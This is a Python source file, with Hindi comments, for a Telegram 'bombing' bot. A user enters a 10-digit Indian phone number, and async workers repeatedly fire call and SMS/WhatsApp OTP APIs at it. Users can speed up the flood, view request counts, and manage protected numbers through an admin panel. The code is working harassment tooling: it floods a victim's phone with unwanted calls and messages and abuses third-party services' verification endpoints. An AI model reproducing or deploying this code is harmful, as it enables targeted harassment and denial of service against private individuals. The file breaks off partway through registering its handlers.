# main.py
import asyncio
import logging
import time
import io
import json
from datetime import datetime, timedelta
from typing import Dict, List, Optional

import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes, AIORateLimiter
)
from telegram.constants import ParseMode

from config import *
from database import *

# ------------------------------------------------------------------
# लॉगिंग सेटअप
# ------------------------------------------------------------------
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ------------------------------------------------------------------
# ग्लोबल स्टेट (बॉम्बिंग सेशन मैनेजमेंट)
# ------------------------------------------------------------------
bombing_events: Dict[int, asyncio.Event] = {}      # user_id -> stop_event
bombing_tasks: Dict[int, List[asyncio.Task]] = {}  # user_id -> [call_task, sms_task]
user_intervals: Dict[int, Dict[str, int]] = {}     # user_id -> {"call": sec, "sms": sec}
user_mode: Dict[int, str] = {}                     # user_id -> BOMB_MODE_*
request_counts: Dict[int, int] = {}                # user_id -> total_requests
status_msg_ids: Dict[int, int] = {}                # user_id -> message_id

BOMB_MODE_CALL_ONLY = "call"
BOMB_MODE_SMS_ONLY = "sms"
BOMB_MODE_BOTH = "both"

# एडमिन स्टेट्स (कन्वर्सेशन के लिए)
STATE_NONE = 0
STATE_AWAITING_PHONE = 1
STATE_AWAITING_MODE = 2
STATE_ADMIN_BAN = 10
STATE_ADMIN_UNBAN = 11
STATE_ADMIN_DELETE = 12
STATE_ADMIN_LOOKUP = 13
STATE_ADMIN_ADDADMIN = 14
STATE_ADMIN_REMOVEADMIN = 15
STATE_ADMIN_PROTECT = 16
STATE_ADMIN_UNPROTECT = 17
STATE_ADMIN_BROADCAST = 18
STATE_ADMIN_DM_TARGET = 19
STATE_ADMIN_DM_MESSAGE = 20
STATE_ADMIN_SET_CALL_INTERVAL = 21
STATE_ADMIN_SET_SMS_INTERVAL = 22

# यूजर डेटा स्टोर करने के लिए (अस्थायी)
user_states: Dict[int, int] = {}
user_temp_data: Dict[int, Dict] = {}

# ------------------------------------------------------------------
# सेल्फ-पिंग (Render को 24/7 जिंदा रखने के लिए)
# ------------------------------------------------------------------
async def keep_alive():
    """हर 5 मिनट में खुद को पिंग करें।"""
    await asyncio.sleep(10)
    while True:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(RENDER_EXTERNAL_URL) as resp:
                    logger.info(f"Keep-alive ping, status: {resp.status}")
        except Exception as e:
            logger.error(f"Keep-alive failed: {e}")
        await asyncio.sleep(5 * 60)  # 5 मिनट

# ------------------------------------------------------------------
# API हिटर (असिंक्रोनस)
# ------------------------------------------------------------------
async def hit_api(session: aiohttp.ClientSession, api: dict, phone: str) -> bool:
    """एक API को हिट करें और सफलता का बूलियन लौटाएँ।"""
    try:
        url = api["url"].replace("{phone}", phone)
        method = api.get("method", "GET")
        headers = api.get("headers", {}).copy()
        headers.setdefault("User-Agent", "Mozilla/5.0")
        data = api.get("data")
        if data:
            data = data.replace("{phone}", phone)
        timeout = aiohttp.ClientTimeout(total=10)
        if method == "POST":
            async with session.post(url, headers=headers, data=data, timeout=timeout, ssl=False) as resp:
                return resp.status in [200, 201, 202]
        else:
            async with session.get(url, headers=headers, timeout=timeout, ssl=False) as resp:
                return resp.status in [200, 201, 202]
    except Exception:
        return False

# ------------------------------------------------------------------
# कॉल वर्कर (एक-एक API हर X सेकंड पर)
# ------------------------------------------------------------------
async def call_worker(user_id: int, phone: str, stop_event: asyncio.Event, context: ContextTypes.DEFAULT_TYPE):
    idx = 0
    total = len(CALL_APIS)
    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            interval = user_intervals.get(user_id, {}).get("call", DEFAULT_CALL_INTERVAL)
            if user_mode.get(user_id) in (BOMB_MODE_CALL_ONLY, BOMB_MODE_BOTH):
                api = CALL_APIS[idx]
                success = await hit_api(session, api, phone)
                if success:
                    request_counts[user_id] = request_counts.get(user_id, 0) + 1
                idx = (idx + 1) % total
            # इंटरवल के दौरान स्टॉप चेक करें
            for _ in range(interval):
                if stop_event.is_set():
                    return
                await asyncio.sleep(1)

# ------------------------------------------------------------------
# SMS/WhatsApp वर्कर (सब एक साथ हर X सेकंड पर)
# ------------------------------------------------------------------
async def sms_worker(user_id: int, phone: str, stop_event: asyncio.Event, context: ContextTypes.DEFAULT_TYPE):
    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            interval = user_intervals.get(user_id, {}).get("sms", DEFAULT_SMS_INTERVAL)
            if user_mode.get(user_id) in (BOMB_MODE_SMS_ONLY, BOMB_MODE_BOTH):
                tasks = [hit_api(session, api, phone) for api in SMS_WHATSAPP_APIS]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                success_count = sum(1 for r in results if r is True)
                request_counts[user_id] = request_counts.get(user_id, 0) + success_count
            for _ in range(interval):
                if stop_event.is_set():
                    return
                await asyncio.sleep(1)

# ------------------------------------------------------------------
# बॉम्बिंग सेशन स्टार्ट करें
# ------------------------------------------------------------------
async def start_bombing_session(user_id: int, phone: str, mode: str, context: ContextTypes.DEFAULT_TYPE):
    if user_id in bombing_events:
        return False, "❌ पहले से ही बॉम्बिंग चल रही है!"

    # प्रोटेक्टेड नंबर चेक (एडमिन/ओनर को छूट)
    if not (await is_admin(user_id) or await is_owner(user_id)):
        if await is_protected(phone):
            return False, "⚠️ यह नंबर प्रोटेक्टेड है और इस पर बॉम्बिंग नहीं की जा सकती।"

    # सेटिंग्स लोड करें
    settings = await get_settings()
    user_intervals[user_id] = {
        "call": settings["call_interval"],
        "sms": settings["sms_interval"]
    }
    user_mode[user_id] = mode
    request_counts[user_id] = 0

    stop_event = asyncio.Event()
    bombing_events[user_id] = stop_event

    tasks = []
    if mode in (BOMB_MODE_CALL_ONLY, BOMB_MODE_BOTH):
        tasks.append(asyncio.create_task(call_worker(user_id, phone, stop_event, context)))
    if mode in (BOMB_MODE_SMS_ONLY, BOMB_MODE_BOTH):
        tasks.append(asyncio.create_task(sms_worker(user_id, phone, stop_event, context)))

    bombing_tasks[user_id] = tasks

    # कंट्रोल कीबोर्ड
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🛑 रोकें", callback_data="stop_bombing"),
         InlineKeyboardButton("⚡ तेज़ करें", callback_data="speed_up"),
         InlineKeyboardButton("🐢 धीमा करें", callback_data="speed_down")],
        [InlineKeyboardButton("📊 स्टैट्स", callback_data="bombing_stats"),
         InlineKeyboardButton("🏠 मुख्य मेनू", callback_data="main_menu")]
    ])
    msg = await context.bot.send_message(
        chat_id=user_id,
        text=(
            f"💣 <b>बॉम्बिंग शुरू!</b>\n"
            f"📱 टारगेट: <code>+91{phone}</code>\n"
            f"📞 कॉल APIs: {len(CALL_APIS)} (अंतराल: {user_intervals[user_id]['call']}s)\n"
            f"💬 SMS/WhatsApp: {len(SMS_WHATSAPP_APIS)} (अंतराल: {user_intervals[user_id]['sms']}s)\n"
            f"🎯 मोड: {mode}"
        ),
        parse_mode=ParseMode.HTML,
        reply_markup=kb
    )
    status_msg_ids[user_id] = msg.message_id
    return True, "✅ बॉम्बिंग शुरू हो गई!"

# ------------------------------------------------------------------
# बॉम्बिंग रोकें
# ------------------------------------------------------------------
async def stop_bombing_session(user_id: int, context: ContextTypes.DEFAULT_TYPE):
    stop_event = bombing_events.pop(user_id, None)
    if stop_event:
        stop_event.set()
    tasks = bombing_tasks.pop(user_id, [])
    for t in tasks:
        t.cancel()
    user_intervals.pop(user_id, None)
    user_mode.pop(user_id, None)
    count = request_counts.pop(user_id, 0)
    msg_id = status_msg_ids.pop(user_id, None)
    if msg_id:
        try:
            await context.bot.edit_message_text(
                chat_id=user_id, message_id=msg_id,
                text=f"🛑 रोक दिया गया। कुल रिक्वेस्ट: {count}{BRANDING}",
                parse_mode=ParseMode.HTML
            )
        except:
            pass
    else:
        await context.bot.send_message(chat_id=user_id, text=f"🛑 रोक दिया गया। कुल रिक्वेस्ट: {count}")

# ------------------------------------------------------------------
# स्पीड एडजस्ट करें
# ------------------------------------------------------------------
async def adjust_speed(user_id: int, increase: bool, context: ContextTypes.DEFAULT_TYPE):
    if user_id not in user_intervals:
        await context.bot.send_message(chat_id=user_id, text="कोई सक्रिय सत्र नहीं है।")
        return
    intervals = user_intervals[user_id]
    if increase:
        intervals["call"] = max(5, intervals["call"] - 2)
        intervals["sms"] = max(2, intervals["sms"] - 1)
        msg = f"⚡ गति बढ़ी। कॉल: {intervals['call']}s, SMS: {intervals['sms']}s"
    else:
        intervals["call"] = min(60, intervals["call"] + 2)
        intervals["sms"] = min(30, intervals["sms"] + 1)
        msg = f"🐢 गति घटी। कॉल: {intervals['call']}s, SMS: {intervals['sms']}s"
    await context.bot.send_message(chat_id=user_id, text=msg)

# ------------------------------------------------------------------
# मीडिया ब्रॉडकास्ट / डीएम हेल्पर
# ------------------------------------------------------------------
async def send_any_message(bot, chat_id: int, update: Update, text: str = None):
    """किसी भी प्रकार का मैसेज (टेक्स्ट, फोटो, वीडियो, आदि) भेजें।"""
    try:
        msg = update.message
        if msg.reply_to_message:
            await bot.copy_message(
                chat_id=chat_id,
                from_chat_id=msg.chat_id,
                message_id=msg.reply_to_message.message_id
            )
            return True
        elif msg.photo:
            await bot.send_photo(chat_id, msg.photo[-1].file_id, caption=msg.caption or "")
            return True
        elif msg.video:
            await bot.send_video(chat_id, msg.video.file_id, caption=msg.caption or "")
            return True
        elif msg.audio:
            await bot.send_audio(chat_id, msg.audio.file_id, caption=msg.caption or "")
            return True
        elif msg.voice:
            await bot.send_voice(chat_id, msg.voice.file_id, caption=msg.caption or "")
            return True
        elif msg.sticker:
            await bot.send_sticker(chat_id, msg.sticker.file_id)
            return True
        elif msg.poll:
            await bot.send_poll(chat_id, question=msg.poll.question, options=[opt.text for opt in msg.poll.options])
            return True
        elif msg.document:
            await bot.send_document(chat_id, msg.document.file_id, caption=msg.caption or "")
            return True
        elif text:
            await bot.send_message(chat_id=chat_id, text=text)
            return True
        else:
            await bot.forward_message(chat_id, msg.chat_id, msg.message_id)
            return True
    except Exception as e:
        logger.error(f"Failed to send message to {chat_id}: {e}")
        return False

# ------------------------------------------------------------------
# कमांड हैंडलर्स
# ------------------------------------------------------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await add_user(user.id, user.username, user.first_name)
    kb = [
        [InlineKeyboardButton("💣 बॉम्बिंग शुरू करें", callback_data="choose_mode")],
        [InlineKeyboardButton("👑 एडमिन पैनल", callback_data="admin_panel")]
    ]
    await update.message.reply_text(
        f"नमस्ते {user.first_name}! 👋\nकोई विकल्प चुनें:",
        reply_markup=InlineKeyboardMarkup(kb)
    )

async def menu_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not (await is_admin(user_id) or await is_owner(user_id)):
        await update.message.reply_text("⛔ अनधिकृत।")
        return
    await show_admin_panel(update.message, user_id)

async def show_admin_panel(target, user_id: int):
    kb = [
        [InlineKeyboardButton("👥 यूजर लिस्ट", callback_data="admin_users_list")],
        [InlineKeyboardButton("🔍 यूजर देखें", callback_data="admin_lookup")],
        [InlineKeyboardButton("🚫 बैन करें", callback_data="admin_ban"),
         InlineKeyboardButton("🔓 अनबैन करें", callback_data="admin_unban"),
         InlineKeyboardButton("🗑 डिलीट करें", callback_data="admin_delete")],
        [InlineKeyboardButton("➕ एडमिन बनाएं", callback_data="admin_addadmin"),
         InlineKeyboardButton("➖ एडमिन हटाएं", callback_data="admin_removeadmin")],
        [InlineKeyboardButton("🛡️ प्रोटेक्ट नंबर", callback_data="admin_protect"),
         InlineKeyboardButton("🔓 हटाएं", callback_data="admin_unprotect"),
         InlineKeyboardButton("📜 लिस्ट", callback_data="admin_list_protected")],
        [InlineKeyboardButton("⚙️ इंटरवल सेट करें", callback_data="admin_set_intervals")],
        [InlineKeyboardButton("📢 ब्रॉडकास्ट", callback_data="admin_broadcast"),
         InlineKeyboardButton("📨 डायरेक्ट मैसेज", callback_data="admin_dm")],
        [InlineKeyboardButton("🔙 मुख्य मेनू", callback_data="main_menu")]
    ]
    text = "👑 <b>एडमिन पैनल</b>\nएक क्रिया चुनें:"
    if hasattr(target, 'edit_text'):
        await target.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))
    else:
        await target.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))

# ------------------------------------------------------------------
# कॉलबैक हैंडलर्स
# ------------------------------------------------------------------
async def main_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    kb = [
        [InlineKeyboardButton("💣 बॉम्बिंग शुरू करें", callback_data="choose_mode")],
        [InlineKeyboardButton("👑 एडमिन पैनल", callback_data="admin_panel")]
    ]
    await query.edit_message_text("मुख्य मेनू:", reply_markup=InlineKeyboardMarkup(kb))

async def choose_mode_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    kb = [
        [InlineKeyboardButton("📞 केवल कॉल", callback_data="mode_call")],
        [InlineKeyboardButton("💬 केवल SMS/WA", callback_data="mode_sms")],
        [InlineKeyboardButton("🔥 दोनों", callback_data="mode_both")],
        [InlineKeyboardButton("🔙 वापस", callback_data="main_menu")]
    ]
    await query.edit_message_text("बॉम्बिंग मोड चुनें:", reply_markup=InlineKeyboardMarkup(kb))

async def mode_selected_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    mode_map = {
        "mode_call": BOMB_MODE_CALL_ONLY,
        "mode_sms": BOMB_MODE_SMS_ONLY,
        "mode_both": BOMB_MODE_BOTH
    }
    mode = mode_map.get(data, BOMB_MODE_BOTH)
    user_id = query.from_user.id
    user_temp_data[user_id] = {"bomb_mode": mode}
    user_states[user_id] = STATE_AWAITING_PHONE
    await query.edit_message_text(
        "📱 कृपया 10 अंकों का फ़ोन नंबर भेजें (बिना +91):",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 रद्द करें", callback_data="main_menu")]])
    )

async def stop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await stop_bombing_session(query.from_user.id, context)

async def speed_up_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await adjust_speed(query.from_user.id, True, context)

async def speed_down_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await adjust_speed(query.from_user.id, False, context)

async def stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if user_id not in request_counts:
        await query.edit_message_text("कोई सक्रिय सत्र नहीं है।")
        return
    count = request_counts[user_id]
    intervals = user_intervals.get(user_id, {})
    mode = user_mode.get(user_id, "N/A")
    await query.edit_message_text(
        f"📊 <b>स्टैट्स</b>\n"
        f"📱 कुल रिक्वेस्ट: {count}\n"
        f"🎯 मोड: {mode}\n"
        f"📞 कॉल अंतराल: {intervals.get('call', '?')}s\n"
        f"💬 SMS अंतराल: {intervals.get('sms', '?')}s",
        parse_mode=ParseMode.HTML
    )

async def admin_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if not (await is_admin(user_id) or await is_owner(user_id)):
        await query.edit_message_text("⛔ अनधिकृत।")
        return
    await show_admin_panel(query, user_id)

# ------------------------------------------------------------------
# एडमिन कॉलबैक (बैन, अनबैन, आदि)
# ------------------------------------------------------------------
async def admin_users_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    users = await get_all_users_paginated(0, 15)
    if not users:
        await query.edit_message_text("कोई यूजर नहीं।")
        return
    text = "👥 <b>यूजर लिस्ट (पेज 1)</b>\n\n"
    for u in users:
        text += f"🆔 {u['user_id']} | @{u.get('username','?')} | {'🔴 बैन' if u.get('banned') else '🟢 एक्टिव'}\n"
    kb = [[InlineKeyboardButton("🔙 वापस", callback_data="admin_panel")]]
    await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))

async def admin_ban_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_states[query.from_user.id] = STATE_ADMIN_BAN
    await query.edit_message_text(
        "🚫 जिसे बैन करना है उसका यूजर ID भेजें:",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 रद्द करें", callback_data="admin_panel")]])
    )

async def admin_unban_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_states[query.from_user.id] = STATE_ADMIN_UNBAN
    await query.edit_message_text(
        "🔓 जिसे अनबैन करना है उसका यूजर ID भेजें:",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 रद्द करें", callback_data="admin_panel")]])
    )

async def admin_delete_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_states[query.from_user.id] = STATE_ADMIN_DELETE
    await query.edit_message_text(
        "🗑 जिसे डिलीट करना है उसका यूजर ID भेजें:",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 रद्द करें", callback_data="admin_panel")]])
    )

async def admin_lookup_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_states[query.from_user.id] = STATE_ADMIN_LOOKUP
    await query.edit_message_text(
        "🔍 यूजर ID भेजें:",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 रद्द करें", callback_data="admin_panel")]])
    )

async def admin_addadmin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_states[query.from_user.id] = STATE_ADMIN_ADDADMIN
    await query.edit_message_text(
        "➕ एडमिन बनाने के लिए यूजर ID भेजें:",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 रद्द करें", callback_data="admin_panel")]])
    )

async def admin_removeadmin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_states[query.from_user.id] = STATE_ADMIN_REMOVEADMIN
    await query.edit_message_text(
        "➖ एडमिन से हटाने के लिए यूजर ID भेजें:",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 रद्द करें", callback_data="admin_panel")]])
    )

async def admin_protect_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_states[query.from_user.id] = STATE_ADMIN_PROTECT
    await query.edit_message_text(
        "🛡️ प्रोटेक्ट करने के लिए 10 अंकों का नंबर भेजें:",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 रद्द करें", callback_data="admin_panel")]])
    )

async def admin_unprotect_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_states[query.from_user.id] = STATE_ADMIN_UNPROTECT
    await query.edit_message_text(
        "🔓 प्रोटेक्शन हटाने के लिए 10 अंकों का नंबर भेजें:",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 रद्द करें", callback_data="admin_panel")]])
    )

async def admin_list_protected_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    numbers = await get_all_protected_numbers()
    if not numbers:
        text = "कोई प्रोटेक्टेड नंबर नहीं है।"
    else:
        text = "🛡️ <b>प्रोटेक्टेड नंबर:</b>\n" + "\n".join(f"<code>{n}</code>" for n in numbers)
    await query.edit_message_text(text, parse_mode=ParseMode.HTML,
                                  reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 वापस", callback_data="admin_panel")]]))

async def admin_set_intervals_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    kb = [
        [InlineKeyboardButton("📞 कॉल इंटरवल", callback_data="set_call_interval")],
        [InlineKeyboardButton("💬 SMS इंटरवल", callback_data="set_sms_interval")],
        [InlineKeyboardButton("🔙 वापस", callback_data="admin_panel")]
    ]
    await query.edit_message_text("किसका इंटरवल बदलना है?", reply_markup=InlineKeyboardMarkup(kb))

async def set_call_interval_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_states[query.from_user.id] = STATE_ADMIN_SET_CALL_INTERVAL
    await query.edit_message_text(
        "📞 कॉल API के लिए नया इंटरवल (सेकंड में) भेजें:",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 रद्द करें", callback_data="admin_panel")]])
    )

async def set_sms_interval_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_states[query.from_user.id] = STATE_ADMIN_SET_SMS_INTERVAL
    await query.edit_message_text(
        "💬 SMS/WhatsApp API के लिए नया इंटरवल (सेकंड में) भेजें:",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 रद्द करें", callback_data="admin_panel")]])
    )

async def admin_broadcast_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_states[query.from_user.id] = STATE_ADMIN_BROADCAST
    await query.edit_message_text(
        "📢 ब्रॉडकास्ट के लिए मैसेज (टेक्स्ट, फोटो, वीडियो आदि) भेजें।\n"
        "आप रिप्लाई में कोई भी मीडिया अटैच कर सकते हैं।",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 रद्द करें", callback_data="admin_panel")]])
    )

async def admin_dm_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_states[query.from_user.id] = STATE_ADMIN_DM_TARGET
    await query.edit_message_text(
        "📨 जिसे DM करना है उसका यूजर ID भेजें:",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 रद्द करें", callback_data="admin_panel")]])
    )

# ------------------------------------------------------------------
# मैसेज हैंडलर (यूजर इनपुट और एडमिन स्टेट्स)
# ------------------------------------------------------------------
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    state = user_states.get(user_id, STATE_NONE)
    text = update.message.text.strip() if update.message.text else ""

    # --- फ़ोन नंबर इनपुट (बॉम्बिंग के लिए) ---
    if state == STATE_AWAITING_PHONE:
        phone = ''.join(filter(str.isdigit, text))
        if len(phone) != 10:
            await update.message.reply_text("❌ अमान्य नंबर। 10 अंक भेजें।")
            return
        user_phone = await get_user_phone(user_id)
        if user_phone == phone:
            await update.message.reply_text("❌ अपने ही नंबर पर बॉम्बिंग नहीं कर सकते!")
            user_states.pop(user_id, None)
            return
        temp = user_temp_data.get(user_id, {})
        mode = temp.get("bomb_mode", BOMB_MODE_BOTH)
        success, msg = await start_bombing_session(user_id, phone, mode, context)
        await update.message.reply_text(msg)
        user_states.pop(user_id, None)
        user_temp_data.pop(user_id, None)

    # --- एडमिन बैन ---
    elif state == STATE_ADMIN_BAN:
        try:
            target = int(text)
            if await ban_user(target):
                await update.message.reply_text(f"✅ यूजर {target} बैन कर दिया गया।")
            else:
                await update.message.reply_text("❌ यूजर नहीं मिला।")
        except:
            await update.message.reply_text("अमान्य ID।")
        user_states.pop(user_id, None)

    # --- एडमिन अनबैन ---
    elif state == STATE_ADMIN_UNBAN:
        try:
            target = int(text)
            if await unban_user(target):
                await update.message.reply_text(f"✅ यूजर {target} अनबैन कर दिया गया।")
            else:
                await update.message.reply_text("❌ यूजर नहीं मिला।")
        except:
            await update.message.reply_text("अमान्य ID।")
        user_states.pop(user_id, None)

    # --- एडमिन डिलीट ---
    elif state == STATE_ADMIN_DELETE:
        try:
            target = int(text)
            if await delete_user(target):
                await update.message.reply_text(f"✅ यूजर {target} डिलीट कर दिया गया।")
            else:
                await update.message.reply_text("❌ यूजर नहीं मिला।")
        except:
            await update.message.reply_text("अमान्य ID।")
        user_states.pop(user_id, None)

    # --- एडमिन लुकअप ---
    elif state == STATE_ADMIN_LOOKUP:
        try:
            target = int(text)
            u = await get_user_by_id(target)
            if not u:
                await update.message.reply_text("❌ यूजर नहीं मिला।")
            else:
                info = (
                    f"👤 <b>यूजर {target}</b>\n"
                    f"नाम: {u.get('first_name','?')}\n"
                    f"यूजरनेम: @{u.get('username','?')}\n"
                    f"रोल: {u.get('role','user')}\n"
                    f"बैन: {'हाँ' if u.get('banned') else 'नहीं'}"
                )
                await update.message.reply_text(info, parse_mode=ParseMode.HTML)
        except:
            await update.message.reply_text("अमान्य ID।")
        user_states.pop(user_id, None)

    # --- एडमिन बनाएं ---
    elif state == STATE_ADMIN_ADDADMIN:
        try:
            target = int(text)
            await set_admin_role(target, True)
            await update.message.reply_text(f"✅ {target} अब एडमिन है।")
        except:
            await update.message.reply_text("अमान्य ID।")
        user_states.pop(user_id, None)

    # --- एडमिन से हटाएं ---
    elif state == STATE_ADMIN_REMOVEADMIN:
        try:
            target = int(text)
            await set_admin_role(target, False)
            await update.message.reply_text(f"✅ {target} अब एडमिन नहीं है।")
        except:
            await update.message.reply_text("अमान्य ID।")
        user_states.pop(user_id, None)

    # --- प्रोटेक्ट नंबर जोड़ें ---
    elif state == STATE_ADMIN_PROTECT:
        phone = ''.join(filter(str.isdigit, text))
        if len(phone) != 10:
            await update.message.reply_text("❌ 10 अंकों का नंबर भेजें।")
            return
        if await add_protected_number(phone, user_id):
            await update.message.reply_text(f"✅ {phone} प्रोटेक्टेड लिस्ट में जोड़ा गया।")
        else:
            await update.message.reply_text("⚠️ यह नंबर पहले से प्रोटेक्टेड है।")
        user_states.pop(user_id, None)

    # --- प्रोटेक्शन हटाएं ---
    elif state == STATE_ADMIN_UNPROTECT:
        phone = ''.join(filter(str.isdigit, text))
        if len(phone) != 10:
            await update.message.reply_text("❌ 10 अंकों का नंबर भेजें।")
            return
        if await remove_protected_number(phone):
            await update.message.reply_text(f"✅ {phone} की प्रोटेक्शन हटा दी गई।")
        else:
            await update.message.reply_text("⚠️ यह नंबर प्रोटेक्टेड नहीं है।")
        user_states.pop(user_id, None)

    # --- कॉल इंटरवल सेट करें ---
    elif state == STATE_ADMIN_SET_CALL_INTERVAL:
        try:
            sec = int(text)
            if sec < 5 or sec > 120:
                await update.message.reply_text("❌ 5 से 120 सेकंड के बीच होना चाहिए।")
                return
            await update_call_interval(sec)
            await update.message.reply_text(f"✅ कॉल इंटरवल {sec} सेकंड सेट कर दिया गया।")
        except:
            await update.message.reply_text("अमान्य संख्या।")
        user_states.pop(user_id, None)

    # --- SMS इंटरवल सेट करें ---
    elif state == STATE_ADMIN_SET_SMS_INTERVAL:
        try:
            sec = int(text)
            if sec < 2 or sec > 60:
                await update.message.reply_text("❌ 2 से 60 सेकंड के बीच होना चाहिए।")
                return
            await update_sms_interval(sec)
            await update.message.reply_text(f"✅ SMS इंटरवल {sec} सेकंड सेट कर दिया गया।")
        except:
            await update.message.reply_text("अमान्य संख्या।")
        user_states.pop(user_id, None)

    # --- ब्रॉडकास्ट ---
    elif state == STATE_ADMIN_BROADCAST:
        user_ids = await get_all_user_ids()
        if not user_ids:
            await update.message.reply_text("कोई यूजर नहीं है।")
            user_states.pop(user_id, None)
            return
        status_msg = await update.message.reply_text(f"📢 {len(user_ids)} यूजर्स को भेज रहे हैं...")
        success = 0
        for uid in user_ids:
            if await send_any_message(context.bot, uid, update, text):
                success += 1
        await status_msg.edit_text(f"✅ ब्रॉडकास्ट पूर्ण: {success}/{len(user_ids)} को भेजा गया।")
        user_states.pop(user_id, None)

    # --- डायरेक्ट मैसेज (टारगेट सेट) ---
    elif state == STATE_ADMIN_DM_TARGET:
        try:
            target = int(text)
            user_temp_data[user_id] = {"dm_target": target}
            user_states[user_id] = STATE_ADMIN_DM_MESSAGE
            await update.message.reply_text(
                f"✅ टारगेट: {target}\nअब जो मैसेज भेजना है वह भेजें (मीडिया भी चलेगा)।",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 रद्द करें", callback_data="admin_panel")]])
            )
        except:
            await update.message.reply_text("अमान्य ID।")
            user_states.pop(user_id, None)

    # --- डायरेक्ट मैसेज (मैसेज भेजें) ---
    elif state == STATE_ADMIN_DM_MESSAGE:
        target = user_temp_data.get(user_id, {}).get("dm_target")
        if not target:
            await update.message.reply_text("कुछ गड़बड़ हो गई।")
            user_states.pop(user_id, None)
            return
        if await send_any_message(context.bot, target, update, text):
            await update.message.reply_text(f"✅ {target} को मैसेज भेज दिया गया।")
        else:
            await update.message.reply_text("❌ मैसेज भेजने में विफल।")
        user_states.pop(user_id, None)
        user_temp_data.pop(user_id, None)

    # --- कोई स्टेट नहीं ---
    else:
        await update.message.reply_text("कृपया मेनू का उपयोग करें।")

# ------------------------------------------------------------------
# एप्लिकेशन सेटअप और मेन फंक्शन
# ------------------------------------------------------------------
async def main():
    # MongoDB कनेक्शन चेक
    try:
        await client.admin.command('ping')
        logger.info("✅ MongoDB connected")
    except Exception as e:
        logger.error(f"❌ MongoDB connection failed: {e}")
        return

    app = Application.builder().token(BOT_TOKEN).rate_limiter(AIORateLimiter()).build()

    # कमांड हैंडलर्स
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("menu", menu_command))
    app.add_handler(CommandHandler("admin", admin_command))

    # कॉलबैक हैंडलर्स
    app.add_handler(CallbackQueryHandler(main_menu_callback, pattern="^main_menu$"))
    app.add_handler(CallbackQueryHandler(choose_mode_callback, pattern="^choose_mode$"))
    app.add_handler(CallbackQueryHandler(mode_selected_callback, pattern="^mode_(call|sms|both)$"))
